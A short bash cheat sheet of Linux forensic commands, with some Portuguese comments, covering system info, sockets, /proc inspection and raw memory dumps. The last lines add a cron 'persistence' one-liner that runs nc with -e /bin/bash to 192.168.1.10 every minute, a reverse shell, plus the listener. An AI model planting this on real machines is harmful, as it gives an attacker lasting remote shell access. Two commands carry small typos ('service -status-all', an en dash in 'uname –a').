#!/bin/bash

# System
date
uname –a
hostname
cat /proc/version
lsmod
service -status-all

#Sockets
ss -p #processes

# Copiar dados em memória para análise posterior:
cp /proc/[PID]/ /[destination]/[PID]/
# Verificar o que o processo está acessando:
ls -al /proc/[PID]/fd
cat /proc/[PID]/maps

#Dump Memory
dd if=/dev/kmem of=/root/kmem
dd if=/dev/mem of=/root/mem

#One liner to add persistence on a box via cron
echo "* * * * * /bin/nc 192.168.1.10 1234 -e /bin/bash" > cron && crontab cron
# and on 192.168.1.10
nc -lvp 1234
